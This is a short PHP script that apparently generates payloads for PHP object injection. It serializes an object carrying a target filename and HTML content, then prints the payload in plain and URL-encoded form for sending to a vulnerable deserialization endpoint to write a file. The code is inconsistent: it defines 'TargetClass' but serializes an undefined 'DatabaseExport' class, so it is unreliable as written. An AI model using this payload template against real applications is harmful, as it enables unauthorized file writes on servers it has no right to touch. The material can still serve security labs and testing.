<?php

// RUN: php serialize.php

// Change Class name to target Class name.
class TargetClass {

    // Change variable to target variable.
    public $target_file = 'gitmasterson1c.html';
    public $file_content = '<h1>Testing</h1>';
}

echo "Plain Payload: \n" . serialize(new DatabaseExport) . "\n";
echo "URL Encoded Payload: \n" . urlencode(serialize(new DatabaseExport)) . "\n";

?>
